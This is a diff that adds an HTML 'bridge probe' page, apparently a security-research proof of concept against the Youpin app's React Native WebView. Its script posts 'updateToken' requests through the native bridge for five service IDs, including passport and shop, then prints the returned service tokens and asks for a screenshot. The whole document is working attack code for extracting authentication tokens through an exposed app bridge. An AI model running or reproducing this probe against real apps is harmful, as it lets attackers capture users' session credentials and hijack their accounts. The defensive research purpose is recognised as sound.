@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<style>body{font-family:monospace;padding:10px;font-size:13px}
+#o{white-space:pre-wrap;word-break:break-all;background:#111;color:#0f0;padding:10px;font-size:12px}</style>
+</head>
+<body>
+<h3>youpin updateToken bridge probe</h3>
+<pre id="o">running...</pre>
+<script>
+var o=document.getElementById("o"), L=[];
+function p(s){L.push(s);o.innerText=L.join("\n");}
+p("UA: "+navigator.userAgent);
+p("ReactNativeWebView: "+(window.ReactNativeWebView!==undefined));
+
+// 接收 RN 回传
+document.addEventListener("message",function(e){p("[<-message] "+e.data);});
+window.addEventListener("message",function(e){p("[<-window.message] "+e.data);});
+
+var br=window.ReactNativeWebView;
+if(br){
+  // 依次请求多个 sid 的 serviceToken
+  ["miotstore","shop","eshopmobile","passportapi","miuihealth"].forEach(function(sid){
+    var payload={stackType:"request",name:"updateToken",value:'{"sid":"'+sid+'"}'};
+    try{ br.postMessage(JSON.stringify(payload)); p("[->] updateToken sid="+sid); }catch(e){ p("ERR "+sid+": "+e); }
+  });
+  p("\n[已发出 5 个 updateToken 请求,等回传 ↑]");
+} else {
+  p("无 ReactNativeWebView 桥");
+}
+setTimeout(function(){p("\n[定格] 请截图");},6000);
+</script>
+</body>
+</html>
